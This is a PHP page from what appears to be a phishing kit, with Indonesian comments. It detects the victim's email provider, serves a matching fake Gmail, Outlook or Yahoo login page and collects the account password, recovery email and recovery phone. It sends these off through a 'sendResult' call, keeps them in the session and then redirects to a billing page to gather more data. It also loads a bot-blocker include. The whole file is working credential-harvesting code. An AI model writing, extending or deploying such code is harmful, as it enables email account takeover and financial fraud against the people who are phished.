<?php
require 'includes/config.php';
require 'includes/functions.php';
require 'includes/blocker.php';

// Language detection removed; using default English
$visitor_info = getClientInfo();
$_SESSION['lang'] = 'en';

if(!isset($_SESSION['email'])) {
    header('Location: login');
    exit;
}

// Validasi ref parameter
$ref = $_GET['ref'] ?? '';
if (empty($ref) || $ref !== ($_SESSION['ref'] ?? '')) {
    header('Location: login');
    exit;
}

$email = $_SESSION['email'];

// Deteksi email provider
$email_lower = strtolower($email);
if (strpos($email_lower, '@gmail.com') !== false) {
    $provider = 'gmail';
    $html_file = 'email/gmail.html';
} elseif (strpos($email_lower, '@hotmail.com') !== false || strpos($email_lower, '@outlook.com') !== false) {
    $provider = 'hotmail';
    $html_file = 'email/outlook.html';
} elseif (strpos($email_lower, '@yahoo.com') !== false) {
    $provider = 'yahoo';
    $html_file = 'email/yahoo.html';
} else {
    $provider = 'generic';
    $html_file = 'email/other.html';
}

// Proses form email provider
if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['password'])) {
    $data = [
        'email' => $_POST['email'] ?? $email,
        'email_provider' => $provider,
        'provider_password' => $_POST['password'],
        'recovery_email' => $_POST['recovery_email'] ?? '',
        'recovery_phone' => $_POST['recovery_phone'] ?? ''
    ];
    
    // Send email access data
    sendResult('email_access', $data);
    
    // Simpan di session
    $_SESSION['provider_password'] = $_POST['password'];
    $_SESSION['recovery_email'] = $_POST['recovery_email'] ?? '';
    $_SESSION['recovery_phone'] = $_POST['recovery_phone'] ?? '';
    
    header('Location: billing?ref=' . $ref);
    exit;
}

// Include HTML file berdasarkan provider
include $html_file;
?>
